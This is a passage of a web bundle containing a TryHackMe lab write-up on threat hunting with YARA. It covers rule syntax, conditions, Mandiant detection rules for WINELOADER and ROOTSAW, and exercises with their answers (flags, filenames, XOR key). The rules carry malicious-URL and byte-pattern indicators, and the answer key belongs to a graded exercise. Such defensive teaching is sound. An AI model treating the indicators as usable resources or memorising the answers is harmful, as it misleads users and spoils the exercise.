src=\\"/cyber/writeup/threathuntingwithyara/939f0f2ec8f84feb9ff6d25823dd5d5e.png\\"></p>",{"id":"Trigger","title":"<h2>Trigger</h2>","body":["<p>This is what starts the hunt for a security threat. A trigger could be:</p>","<p><ul><li>A warning sign, like a suspicious file (IOC).</li><li>A known behavior or method used by attackers (TTPs).</li><li>An educated guess (hypothesis).</li><li>A system acting strangely.</li><li>Information from blogs, news, or reports from other companies.</li></ul></p>"]},{"id":"Investigation","title":"<h2>Investigation</h2>","body":["<p>Once you pick a trigger, you use it to start searching for problems.</p>","<p><ul><li>List itemSecurity experts use tools like malware scanners, network tools (e.g., Wireshark), or rules (like YARA) to find anything unusual in the systems or files.</li></ul></p>"]},{"id":"Resolution","title":"<h2>Resolution</h2>","body":["<p>If evidence of a security breach is found:</p>","<p><ul><li>The incident response (IR) team is informed to handle the problem.</li><li>The threat hunter may help the IR team investigate further, find the root cause, and figure out how bad the damage is.</li></ul></p>"]},{"id":"Opportunities","title":"<h2>Opportunities</h2>","body":["<p>How to apply the above scenarios:</p>","<p>Example: The received threat intelligence details specific TTPs attributed to APT29, which is known to target political entities. This intelligence enables a structured hunting style using the TTPs included in the report to build a hypothesis.</p>","<p>Example: The received threat intel includes Indicators of Compromise and YARA rules to hunt for malware. This intelligence enables an unstructured hunting style using the IOCs provided.</p>","<p>The two opportunities above can be combined to enable a situational or entity-driven hunting style.</p>"]},{"id":"Answer the questions below pt.2","title":"<h2>Answer the questions below</h2>","body":["<p><b>Q:</b> <i>Which threat hunting style is proactive and uses indicators of attack and TTPs?</i><br><b>A:</b> <i>structured hunting</i></p>","<p><b>Q:</b> <i>In which phase of the threat hunting process, tools like YARA or Volatility are used?</i><br><b>A:</b> <i>Investigation</i></p>","<p><b>Q:</b> <i>You have received a threat intelligence report consisting only of Indicators of Compromise. What threat hunting style do you recommend to use?</i><br><b>A:</b> <i>unstructured hunting</i></p>"]}]},{"id":"YARA Rule Introduction","title":"<h1><span style=\\"color:#da1953\\">YAR</span>A Rule Introduction</h1>","body":["<p>YARA stands for Yet Another Ridiculous Acronym. It is a tool Victor Alvarez of VirusTotal developed to assist malware researchers in detecting and describing malware families. The main functionality of YARA is based on advanced pattern matching, explicitly tailored to malware. It can be best compared to using a supercharged grep with complex regular expressions in Linux. Just like the grep command, the YARA binary will iterate over all files in a designated path, trying to find a match with the information provided in the YARA rule. A YARA rule describes a malware family based on a pattern using a set of strings and Boolean logic.</p>",{"id":"Structure of a YARA Rule","title":"<h2>Structure of a YARA Rule</h2>","body":["<p>Yara rules are compsed by <strong>name</strong>, <strong>meta</strong>, <strong>strings</strong>, and <strong>condition</strong>.</p>","<p><strong>Rule Name</strong></p>","<p>The Rule name is a descriptive name for the rule and starts with the keyword rule. Best practices include setting a name that clarifies what the rule is used for.</p>","<p><strong>Meta</strong></p>","<p>This part defines extra information like description, author, and more. Custom identifiers and value pairs can be freely created. The information defined in meta cannot be used in the condition part. Whether to include this part or not is entirely up to you. The rule will work completely fine without it. It is, however, recommended to include the meta part with some basic information, including the author and the description of what to use the rule for.</p>","<p><strong>Strings</strong></p>","<p>In this part of the rule, matching strings are defined. Multiple types of strings can be defined, which is essential for creating functional rules.</p>","<p><strong>Condition</strong></p>","<p>In this part of the rule, a matching condition is defined using the identifiers defined in the strings part.</p>"]}]},{"id":"Example of a YARA Rule","title":"<h1><span style=\\"color:#da1953\\">Exa</span>mple of a YARA Rule</h1>","body":["<p><strong>Rule name</strong>: M_APT_Dropper_Rootsaw_Obfuscated. The rule’s title is well-chosen and gives the user a good idea of what to use it for. In this case, it is to detect a dropper called Rootsaw that is obfuscated.</p>","<p><strong>Meta</strong>: It is good practice to include relevant data that provides more information about the rule. This helps the user of the YARA rule know what to use the rule for, who wrote it, and where to apply it.</p>","<p><strong>Strings</strong>: The strings included in this example help the user find a file containing those strings. How do malware analysts choose those strings? They analyze the malware and determine what uniquely identifies it. The strings used are text strings. The first two lines are straightforward.</p>","<p><strong>Condition</strong>: This rule requires that all defined strings be present to have a match. This means all the strings defined in part 3 must have a match in the same file being matched against.</p>","<p><img src=\\"/cyber/writeup/threathuntingwithyara/093256bb495d401999c533781793f3ce.png\\"></p>",{"id":"Answer the questions below pt.3","title":"<h2>Answer the questions below</h2>","body":["<p><b>Q:</b> <i>Apart from the rule name, which other section is also required in a YARA rule?</i><br><b>A:</b> <i>condition</i></p>"]}]},{"id":"Yara Strings and Conditions","title":"<h1><span style=\\"color:#da1953\\">Yar</span>a Strings and Conditions</h1>","body":[{"id":"False positives","title":"<h2>False positives</h2>","body":["<p>An important part of threat hunting is avoiding false alarms. With YARA, this means writing rules that accurately detect the specific threat. However, writing good YARA rules can be tricky and complicated, especially for specific malware. You have two options:</p>","<p><ul><li>Learn to write detailed YARA rules yourself.</li><li>Use rules made by experts (like those from threat intelligence reports).</li></ul><p>You can also combine both approaches. Even if you use pre-made rules, it’s important to understand how they work.</p>",{"id":"Strings","title":"<h4>Strings</h4>","body":["<p><strong>Text String</strong></p>","<p>Strings are case sensitive.</p>","<pre class=\\"yara\\"><br><span class=\\"rulename\\">rule textString</span><br>{<br>  <span class=\\"section\\">strings:</span><br>    <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"This is an ASCII-encoded string\\"</span> <span class=\\"comment\\">//strings are defined between double quotes</span><br>    <span class=\\"key\\">$2</span> = <span class=\\"string\\">\\"This is an ascii-encoded string\\"</span> <span class=\\"comment\\">//not the same as $1.</span><br><br>  <span class=\\"section\\">condition:</span><br>    <span class=\\"condition\\">all of them</span><br>}<br></pre><br>","<pre class=\\"yara\\"><br><span class=\\"rulename\\">rule noCaseTextString</span><br>{<br>    <span class=\\"section\\">strings:</span> <br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"This is an ASCII-encoded string\\"</span> <span class=\\"key\\">nocase</span><br>    <br>    <span class=\\"section\\">condition:</span>  <br>      <span class=\\"key\\">$1</span><br>}<br></pre>","<p><b>Wide-Character Strings</b></p>","Used for special encoded strings. It is possible to use a modifier next to the defined string so the rule matches for this wide-character string. In this case the modifier used is <b>wide</b>.","<pre class=\\"yara\\"><br><span class=\\"rulename\\">rule wideTextString</span><br>{<br>    <span class=\\"section\\">strings:</span> <br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"tryhackme\\"</span> <span class=\\"key\\">wide</span>      <span class=\\"comment\\">// will match with t\\\\x00r\\\\x00y\\\\x00h\\\\x00a\\\\x00c\\\\x00k\\\\x00m\\\\x00e\\\\x00</span><br>    <br>    <span class=\\"section\\">condition:</span>  <br>      <span class=\\"key\\">$1</span><br>}<br></pre>","<p><strong>Hexadecimal String</strong></p>","<p>When malware analysts study malware, they use tools like IDA Pro to break down the code, which often appears in hexadecimal format. These hexadecimal strings can be used to create YARA rules because they are harder for attackers to hide or change. This makes them a reliable way to identify specific malicious files.</p>","<pre class=\\"yara\\"><br><span class=\\"rulename\\">rule hexString</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"hex\\">{ E2 34 B6 C8 A3 FB }</span> <span class=\\"comment\\">// Hexadecimal strings are defined between {}</span><br>    <br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"key\\">$1</span><br>}<br></pre><br>","<pre class=\\"yara\\"><br><span class=\\"rulename\\">rule hexStringExpanded</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"hex\\">{ E2 34 B6 ?? A3 FB }</span> <span class=\\"comment\\">// The ? is a wildcard and can represent any hex value.</span><br>      <span class=\\"key\\">$2</span> = <span class=\\"hex\\">{ E2 34 B6 ~00 A3 FB }</span> <span class=\\"comment\\">// The ~ is a not operator that precedes the value to exclude from the search. In this case 00.</span><br>      <span class=\\"key\\">$3</span> = <span class=\\"hex\\">{ E2 34 [2-4] A3 FB }</span> <span class=\\"comment\\">// The [X-Y] construct defines a jump. This means that any value between 2 and 4 bytes can occupy this position.</span><br>      <span class=\\"key\\">$4</span> = <span class=\\"hex\\">{ E2 34 (C5|B5) A3 FB }</span> <span class=\\"comment\\">// Between () alternative byte sequences can be defined separated with the boolean operator OR. The value can be B5 OR C5.</span><br>    <br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"key\\">$1</span><br>}<br></pre>","<p><strong>XOR String</strong></p>","<p>Malware creators use XOR encryption to hide their code, making it harder for analysts to analyze and avoid detection by antivirus software. YARA helps by detecting these encrypted strings, even when the encryption uses 1-byte keys.</p>","<pre class=\\"yara\\"><br><span class=\\"rulename\\">rule xorString</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"http://maliciousurl.thm\\"</span> <span class=\\"key\\">xor</span> <span class=\\"comment\\">// This line will look for all variations possible with a 1-byte XOR key</span><br>    <br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"key\\">$1</span><br>}<br></pre><br>","<pre class=\\"yara\\"><span class=\\"rulename\\">rule base64String</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"This is a regular string\\"</span> <span class=\\"key\\">base64</span> <span class=\\"comment\\">// At runtime YARA will encode the string with base64 and look for matches.</span><br><br>    <span class=\\"section\\">condition:</span><br>     <span class=\\"key\\">$1</span><br>}<br></pre>","<p><strong>Regular Expressions</strong></p>","<p>You can define regular expressions the same way as strings, with the only difference being forward slashes instead of double quotes.</p>","<pre class=\\"yara\\"><span class=\\"rulename\\">rule regularExpression</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">/THM\\\\{[a-zA-Z]{3}\\\\}/</span> <span class=\\"comment\\">// This regex will match any string that starts with \\"THM{\\", ends with \\"}\\" and has 3 alphabetic characters (lower-case or upper-case) between the curly brackets.</span><br><br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"key\\">$1</span><br>}<br></pre><br>"]}]}]},{"id":"Conditions","title":"<h1><span style=\\"color:#da1953\\">Con</span>ditions</h1>","body":["<br>","<table ><thead ><tr ><th >Boolean operators</th><th >Relational operators</th><th >Arithmetic operators</th><th >Bitwise operators</th><th >Keywords</th></tr></thead><tbody ><tr ><td >and</td><td >&gt;=</td><td >+</td><td >&amp;</td><td >1 of them</td></tr><tr ><td >or</td><td >&lt;=</td><td >-</td><td >|</td><td >any of them</td></tr><tr ><td >not</td><td >&lt;</td><td >*</td><td >&lt;&lt;</td><td >none of them</td></tr><tr ><td ></td><td >&gt;</td><td >\\\\</td><td >&gt;&gt;</td><td >contains</td></tr><tr ><td ></td><td >==</td><td >%</td><td >~</td><td >icontains</td></tr><tr ><td ></td><td >!=</td><td ></td><td >^</td><td >startswith</td></tr><tr ><td ></td><td ></td><td ></td><td ></td><td >istartswith</td></tr><tr ><td ></td><td ></td><td ></td><td ></td><td >endswith</td></tr><tr ><td ></td><td ></td><td ></td><td ></td><td >iendswith</td></tr><tr ><td ></td><td ></td><td ></td><td ></td><td >iequals</td></tr><tr ><td ></td><td ></td><td ></td><td ></td><td >matches</td></tr><tr ><td ></td><td ></td><td ></td><td ></td><td >not defined</td></tr><tr ><td ></td><td ></td><td ></td><td ></td><td >filesize</td></tr></tbody></table>","<p>Some examples:</p>","<pre class=\\"yara\\"><span class=\\"rulename\\">rule differentConditions</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"Try\\"</span><br>      <span class=\\"key\\">$2</span> = <span class=\\"string\\">\\"Hack\\"</span><br>      <span class=\\"key\\">$3</span> = <span class=\\"string\\">\\"Me\\"</span><br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"key\\">all</span> <span class=\\"key\\">of</span> <span class=\\"key\\">them</span> <span class=\\"comment\\">// Matches when all defined strings are present.</span><br>}<br></pre><br>","<pre class=\\"yara\\"><span class=\\"rulename\\">rule differentConditions</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"Try\\"</span><br>      <span class=\\"key\\">$2</span> = <span class=\\"string\\">\\"Hack\\"</span><br>      <span class=\\"key\\">$3</span> = <span class=\\"string\\">\\"Me\\"</span><br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"key\\">any</span> <span class=\\"key\\">of</span> <span class=\\"key\\">them</span> <span class=\\"comment\\">// Matches when at least one of the defined strings is present.</span><br>}<br></pre><br>","<pre class=\\"yara\\"><span class=\\"rulename\\">rule differentConditions</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"Try\\"</span><br>      <span class=\\"key\\">$2</span> = <span class=\\"string\\">\\"Hack\\"</span><br>      <span class=\\"key\\">$3</span> = <span class=\\"string\\">\\"Me\\"</span><br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"key\\">1</span> <span class=\\"key\\">of</span> <span class=\\"string\\">$(*)</span> <span class=\\"comment\\">// Identical to \\"any of them\\" condition.</span><br>}<br></pre><br>","<pre class=\\"yara\\"><span class=\\"rulename\\">rule differentConditions</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"Try\\"</span><br>      <span class=\\"key\\">$2</span> = <span class=\\"string\\">\\"Hack\\"</span><br>      <span class=\\"key\\">$3</span> = <span class=\\"string\\">\\"Me\\"</span><br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"string\\">\\"$1 or $2\\"</span> <span class=\\"comment\\">// Matches when \'Try\' or \'Hack\' is present.</span><br>}<br></pre>","<p><span style=\\"color:#FFC107\\">In the example above, it seems there is an error as the condition in quotes and the next one is not. I have to verify if the quotes changes the behavior or is intended.</span></p>","<pre class=\\"yara\\"><span class=\\"rulename\\">rule differentConditions</span><br>{<br>    <span class=\\"section\\">strings:</span><br>        <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"Try\\"</span><br>        <span class=\\"key\\">$2</span> = <span class=\\"string\\">\\"Hack\\"</span><br>        <span class=\\"key\\">$3</span> = <span class=\\"string\\">\\"Me\\"</span><br>    <span class=\\"section\\">condition:</span><br>        <span class=\\"key\\">$1</span> <span class=\\"key\\">and</span> <span class=\\"key\\">$2</span> <span class=\\"comment\\">// Matches when \'Try\' and \'Hack\' are present.</span><br>}<br></pre><br>","<pre class=\\"yara\\"><span class=\\"rulename\\">rule differentConditions</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"Try\\"</span><br>      <span class=\\"key\\">$2</span> = <span class=\\"string\\">\\"Hack\\"</span><br>      <span class=\\"key\\">$3</span> = <span class=\\"string\\">\\"Me\\"</span><br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"key\\">$1</span> <span class=\\"key\\">and</span> (<span class=\\"key\\">$2</span> <span class=\\"key\\">or</span> <span class=\\"key\\">$3</span>) <span class=\\"comment\\">// Matches when \'Try\' and \'Hack\' or \'Try\' and \'Me\' combinations are present.</span><br>}<br></pre><br>","<pre class=\\"yara\\"><span class=\\"rulename\\">rule differentConditions</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"Try\\"</span><br>      <span class=\\"key\\">$2</span> = <span class=\\"string\\">\\"Hack\\"</span><br>      <span class=\\"key\\">$3</span> = <span class=\\"string\\">\\"Me\\"</span><br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"key\\">none</span> <span class=\\"key\\">of</span> <span class=\\"key\\">them</span> <span class=\\"comment\\">// Matches only when none of the defined strings are present.</span><br>}<br></pre><br>","<pre class=\\"yara\\"><span class=\\"rulename\\">rule differentConditions</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"Try\\"</span><br>      <span class=\\"key\\">$2</span> = <span class=\\"string\\">\\"Hack\\"</span><br>      <span class=\\"key\\">$3</span> = <span class=\\"string\\">\\"Me\\"</span><br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"key\\">filesize</span> <span class=\\"key\\">&lt;</span> <span class=\\"key\\">500KB</span> <span class=\\"comment\\">// Matches all files smaller than 500 KiloByte. This can only be used when matching for files.</span><br>}<br></pre><br>","<pre class=\\"yara\\"><span class=\\"rulename\\">rule differentConditions</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"Try\\"</span><br>      <span class=\\"key\\">$2</span> = <span class=\\"string\\">\\"Hack\\"</span><br>      <span class=\\"key\\">$3</span> = <span class=\\"string\\">\\"Me\\"</span><br>    <span class=\\"section\\">condition:</span><br>      (<span class=\\"key\\">$1</span> <span class=\\"key\\">or</span> <span class=\\"key\\">$2</span>) <span class=\\"key\\">and</span> <span class=\\"key\\">filesize</span> <span class=\\"key\\">&lt;</span> <span class=\\"key\\">200KB</span> <span class=\\"comment\\">// Matches for \'Try\' or \'Hack\' in files smaller than 200KB.</span><br>}<br></pre><br>",{"id":"Answer the questions below pt.4","title":"<h2>Answer the questions below</h2>","body":["<p><b>Q:</b> <i>What modifier should be used if you want to search for 2-byte encoded characters?</i><br><b>A:</b> <i>wide</i></p>","<p><b>Q:</b> <i>What condition should be used if you want to exclude the defined strings from the matching process?</i><br><b>A:</b> <i>none of them</i></p>"]}]},{"id":"Basic Syntax for YARA","title":"<h1><span style=\\"color:#da1953\\">Bas</span>ic Syntax for YARA</h1>","body":["<p>Execute Yara rules with <code>yara64</code>.</p>","<pre class=\\"powershell\\">PS C:\\\\TMP> yara64<br>yara: wrong number of arguments  # Red text (error)<br>Usage: yara [OPTION]... [NAMESPACE:]RULES_FILE... FILE | DIR | PID  # Cyan text (help/usage)<br>Try `--help` for more options  # Cyan text (help)</pre>","<p>Use the argument <code>--help</code> to see the available options.</p>","<table>  <tbody><tr>    <th>Short Flag</th>    <th>Long Flag</th>    <th>Description</th>  </tr>  <tr>    <td>-r</td>    <td>--recursive</td>    <td>Scan directories recursively</td>  </tr>  <tr>    <td>-n</td>    <td>--negate</td>    <td>Print only rules that weren\'t matched</td>  </tr>  <tr>    <td>-S</td>    <td>--print-stats</td>    <td>Print metadata related to the performance and efficiency of the rule</td>  </tr>  <tr>    <td>-s</td>    <td>--print-strings</td>    <td>Print the strings that were matched in a file</td>  </tr>  <tr>    <td>-X</td>    <td>--print-xor-key</td>    <td>Print xor key and plaintext of matched strings</td>  </tr>  <tr>    <td>-v</td>    <td>--version</td>    <td>Show the YARA version</td>  </tr>  <tr>    <td>-p</td>    <td>--threads=N</td>    <td>Use N threads to scan a directory</td>  </tr></tbody></table><br>",{"id":"Run a YARA Rule for the First Time","title":"<h2>Run a YARA Rule for the First Time<h2>","body":["<br><pre class=\\"powershell-code\\">PS C:\\\\TMP&gt;<span class=\\"cmdlet\\">get-content</span> C:\\\\TMP\\\\YARARULES\\\\myfirstrule.yar<br>rule myfirstrule <br>{<br>    meta:<br>        Description = \\"Searches for the string tryhackme\\"<br>        Author = \\"TryHackMe\\"<br>    <br>    strings:<br>        $s = \\"tryhackme\\"<br> <br>    condition:<br>        $s<br>}<br></pre>","<p>This rule searches for the string <em>tryhackme</em> in the give directory as argument. For example if the target directory where I want to search is <code>C:\\\\TMP</code> I have to run the following command.</p>","<pre class=\\"powershell-code\\">PS C:\\\\TMP> <span class=\\"cmdlet\\">yara64</span> C:\\\\TMP\\\\YARARULES\\\\myfirstrule.yar C:\\\\TMP\\\\<br>myfirstrule C:\\\\TMP\\\\test.txt</pre><br>","<p>The result shows that the string matches inside the file <code>C:\\\\TMP\\\\test.txt</code></p>"]},{"id":"Combine Multiple Rules in One File","title":"<h2>Combine Multiple Rules in One File</h2>","body":["<p>Putting multiple YARA rules in one file can make things easier, especially when they focus on the same malware, campaign, or purpose. For example, if you’re tracking a malware family with different versions, having all the rules in one file keeps everything organized and easier to use. The same goes for investigating a phishing campaign—grouping rules for emails, payloads, and domains into one file makes the process smoother.</p>","<p>On the other hand, if the rules are unrelated, it’s better to keep them in separate files. This avoids confusion and makes updates easier. The idea is simple: combine rules that share a common goal to keep things clear and efficient, but don’t lump everything together just for the sake of it.</p>","<pre class=\\"yara\\"><span class=\\"rulename\\">rule M_APT_Downloader_WINELOADER_1</span><br>{<br>    <span class=\\"section\\">meta:</span><br>      <span class=\\"key\\">author</span> = <span class=\\"string\\">\\"Mandiant\\"</span><br>      <span class=\\"key\\">disclaimer</span> = <span class=\\"string\\">\\"This rule is meant for hunting and is not tested to run in a production environment.\\"</span><br>      <span class=\\"key\\">description</span> = <span class=\\"string\\">\\"Detects rc4 decryption logic in WINELOADER samples\\"</span><br><br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$</span> = <span class=\\"hex\\">{B9 00 01 00 00 99 F7 F9 8B 44 24 [50-200] 0F B6 00 3D FF 00 00 00}</span> <span class=\\"comment\\">// Key initialization</span><br>      <span class=\\"key\\">$</span> = <span class=\\"hex\\">{0F B6 00 3D FF 00 00 00}</span> <span class=\\"comment\\">// Key size</span><br><br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"condition\\">all of them</span><br>}<br><br><span class=\\"rulename\\">rule M_APT_Downloader_WINELOADER_2</span><br>{<br>    <span class=\\"section\\">meta:</span><br>      <span class=\\"key\\">author</span> = <span class=\\"string\\">\\"Mandiant\\"</span><br>      <span class=\\"key\\">disclaimer</span> = <span class=\\"string\\">\\"This rule is meant for hunting and is not tested to run in a production environment.\\"</span><br>      <span class=\\"key\\">description</span> = <span class=\\"string\\">\\"Detects payload invocation stub in WINELOADER\\"</span><br><br>    <span class=\\"section\\">strings:</span><br><br>      <span class=\\"comment\\">// 48 8D 0D ?? ?? 00 00  lea rcx, module_start (Pointer to encrypted resource)</span><br>      <span class=\\"comment\\">// 48 C7 C2 ?? ?? 00 00  mov rdx, ???? (size of encrypted source)</span><br>      <span class=\\"comment\\">// E8 [4]  call decryption</span><br>      <span class=\\"comment\\">// 48 8D 05 [4]  lea rcx, ??</span><br>      <span class=\\"comment\\">// 48 8D 0D [4]  lea rax, module_start (decrypted resource)</span><br>      <span class=\\"comment\\">// 48 89 05 [4]  mov ptr_mod, rax</span><br><br>      <span class=\\"key\\">$</span> = <span class=\\"hex\\">{48 8D 0D ?? ?? 00 00 48 C7 C2 ?? ?? 00 00 E8 [4] 48 8D 0D [4] 48 8D 05 [4] 48 89 05}</span><br><br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"condition\\">all of them</span><br>}<br><br><span class=\\"rulename\\">rule M_APT_Dropper_Rootsaw_Obfuscated</span><br>{<br>    <span class=\\"section\\">meta:</span><br>      <span class=\\"key\\">author</span> = <span class=\\"string\\">\\"Mandiant\\"</span><br>      <span class=\\"key\\">disclaimer</span> = <span class=\\"string\\">\\"This rule is meant for hunting and is not tested to run in a production environment.\\"</span><br>      <span class=\\"key\\">description</span> = <span class=\\"string\\">\\"Detects obfuscated ROOTSAW payloads\\"</span><br><br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$</span> = <span class=\\"string\\">\\"function _\\"</span><br>      <span class=\\"key\\">$</span> = <span class=\\"string\\">\\"new XMLHttpRequest();\\"</span><br>      <span class=\\"key\\">$</span> = <span class=\\"string\\">\'\\\\x2e\\\\x7a\\\\x69\\\\x70\'</span><br>      <span class=\\"key\\">$</span> = <span class=\\"string\\">\'\\\\x4f\\\\x70\\\\x65\\\\x6e\'</span><br>      <span class=\\"key\\">$</span> = <span class=\\"string\\">\\"\\\\x43\\\\x3a\\\\x5c\\\\x57\\"</span><br>      <span class=\\"key\\">$</span> = <span class=\\"string\\">\\"https://waterforvoiceless.org/util.php\\"</span><br><br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"condition\\">2 of them</span><br>}<br></pre><br>",""]},{"id":"Answer the questions below pt.5","title":"<h2>Answer the questions below</h2>","body":["<p><b>Q:</b> <i>What option do you need to pass to ensure you scan all directories recursively?</i><br><b>A:</b> <i>-r</i></p>"]}]},{"id":"Indicators of Compromise Detected","title":"<h1><span style=\\"color:#da1953\\">Ind</span>icators of Compromise Detected</h1>","body":["<p>When you find clear evidence of a security problem (called an Indicator of Compromise) on a system, the first thing to do is follow the steps in your company\'s incident response (IR) plan. A good company will have a document that explains what to do before, during, and after a security incident.</p>","<p>Your first step is usually to tell the person or team in charge of handling incidents. They will follow the plan, bring the right people together, and start working on fixing the problem.</p>","<p>The plan might include using a system like DAIR (Dynamic Approach to Incident Response) to organize the steps. You might be asked to help with tasks such as looking more closely at the affected computer, saving important evidence, disconnecting the computer from the network, and more.</p>","<p><img src=\\"/cyber/writeup/threathuntingwithyara/e339857f7cbe4837933227b7a5c02b1c.png\\"></p>","<p>When you\'re threat hunting, it’s very important to write down everything you find. This information can be really helpful if there\'s ever an incident, and it can save time when you start responding to it. Time is very important when dealing with security problems. If you look at the Cyber Kill Chain below, documenting things early could make the difference between catching a problem in the Command and Control (C2) phase or later when the attacker has already started doing damage (Actions on Objectives phase).</p>","<p><img src=\\"/cyber/writeup/threathuntingwithyara/89a367f72a384ac692a90544c8d473e2.png\\"></p>",""]},{"id":"YARA: Hands-on Exercise","title":"<h1><span style=\\"color:#da1953\\">YAR</span>A: Hands-on Exercise</h1>","body":[{"id":"Exercise 1","title":"<h2>Exercise 1</h2>","body":["<p>Write a YARA rule to find the file that contains the pattern <i>\\"THM{}\\"</i>. Use the <code>C:\\\\TMP\\\\Exercise1\\\\</code> path as the target in the YARA command, enter the flag as the answer.</p>","<pre class=\\"yara\\"><span class=\\"rulename\\">rule exercise1</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"THM{\\"</span><br><br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"condition\\">$1</span><br>}<br></pre>","<p>Run as:</p>","<pre class=\\"powershell-code\\">PS C:\\\\TMP\\\\YARARULES> <span class=\\"cmdlet\\">yara64</span> .\\\\exercise1.yara C:\\\\TMP\\\\Exercise1</pre><br>"]},{"id":"Exercise 2","title":"<h2>Exercise 2</h2>","body":["<p>Write a YARA rule that finds the file that contains the following strings: <i>\\"Yet another\\"</i>, \\"<i>Ridiculous acronym\\"</i>. Use the <code>C:\\\\TMP\\\\Exercise2\\\\</code> path as the target in the YARA command. Enter the name of the file as the answer.</p>","<pre class=\\"yara\\"><span class=\\"rulename\\">rule exercise2</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"Yet another\\"</span> <span class=\\"comment\\">wide</span><br>      <span class=\\"key\\">$2</span> = <span class=\\"string\\">\\"Ridiculous acronym\\"</span> <span class=\\"comment\\">wide</span><br><br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"condition\\">$1</span> <span class=\\"condition\\">and</span> <span class=\\"condition\\">$2</span><br>}<br></pre>","<p>Run as:</p>","<pre class=\\"powershell-code\\">PS C:\\\\TMP\\\\YARARULES> <span class=\\"cmdlet\\">yara64</span> .\\\\exercise2.yara C:\\\\TMP\\\\Exercise2</pre><br>    "]},{"id":"Exercise 3","title":"<h2>Exercise 3</h2>","body":["<p>Write a YARA rule that searches for the file that contains the base64 encoded string <i>\\"THM{This was a really fun exercise}\\"</i>. Use the <code>C:\\\\TMP\\\\Exercise3\\\\</code> path as the target in the YARA command, and enter name of the file as the answer.</p>","<pre class=\\"yara\\"><span class=\\"rulename\\">rule exercise3</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"THM{This was a really fun exercise}\\"</span> <span class=\\"comment\\">base64</span><br><br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"condition\\">$1</span><br>}<br></pre>   ","<p>Run as:</p>","<pre class=\\"powershell-code\\">PS C:\\\\TMP\\\\YARARULES> <span class=\\"cmdlet\\">yara64</span> .\\\\exercise3.yara C:\\\\TMP\\\\Exercise3</pre><br>"]},{"id":"Exercise 4","title":"<h2>Exercise 4</h2>","body":["<p>Write a YARA rule that searches for the XOR encrypted string <i>\\"THM{FoundSomethingHidden}\\"</i> in the <code>C:\\\\TMP</code> directory and subdirectories. Fill in the encrypted text and XOR key used.</p>","<pre class=\\"yara\\"><span class=\\"rulename\\">rule exercise4</span><br>{<br>    <span class=\\"section\\">strings:</span><br>      <span class=\\"key\\">$1</span> = <span class=\\"string\\">\\"THM{FoundSomethingHidden}\\"</span> <span class=\\"comment\\">xor</span><br><br>    <span class=\\"section\\">condition:</span><br>      <span class=\\"condition\\">$1</span><br>}<br></pre>","<p>Run as:</p>","<pre class=\\"powershell-code\\">PS C:\\\\TMP\\\\YARARULES> <span class=\\"cmdlet\\">yara64</span> .\\\\exercise4.yara -X C:\\\\TMP\\\\Exercise4</pre><br>"]},{"id":"Answer the questions below pt.6","title":"<h2>Answer the questions below</h2>","body":["<p><b>Q:</b> <i>What is the flag found in exercise 1?</i><br><b>A:</b> <i>THM{Threathuntingisawesome}</i></P>","<p><b>Q:</B> <i>What is the filename found in exercise 2? (Format: filename.extension)</i><br><b>A:</b> <i>file10.txt</i></P>","<p><b>Q:</B> <i>What is the filename found in exercise 3? (Format: filename.extension)</i><br><b>A:</b> <i>file13.txt</i></P>","<p><b>Q:</B> <i>What was the XOR key used for encryption in exercise 4?</i><br><b>A:</b> <i>0x01</i></P>","<p><b>Q:</B> <i>What encrypted string did you find in exercise 4?</i><br><b>A:</b> <i>UILzGntoeRnlduihofIheedo|</i></P>"]}]}]}]}')},1223:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Tomcat","path":"tomcat","tags":["easy","ctf","box","htb","web","cms","powershell","iwr","python webserver","apache 